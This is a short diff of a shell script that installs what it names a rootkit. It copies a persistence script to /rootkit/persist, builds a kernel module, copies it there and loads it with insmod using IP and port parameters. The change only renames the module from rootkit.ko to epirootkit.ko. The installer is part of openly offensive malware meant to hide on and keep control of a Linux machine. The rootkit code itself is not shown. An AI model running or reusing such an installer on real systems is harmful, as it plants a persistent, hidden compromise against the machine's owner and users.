@@ -26,9 +26,9 @@ sudo cp ./persist.sh /rootkit/persist
 echo "Building..."
 make -B 2>/dev/null
 
-sudo cp ./rootkit.ko /rootkit/persist
+sudo cp ./epirootkit.ko /rootkit/persist
 
 echo "Inserting.."
-sudo insmod ./rootkit.ko ip="$ip" port="$port"
+sudo insmod ./epirootkit.ko ip="$ip" port="$port"
 
 echo "Done"
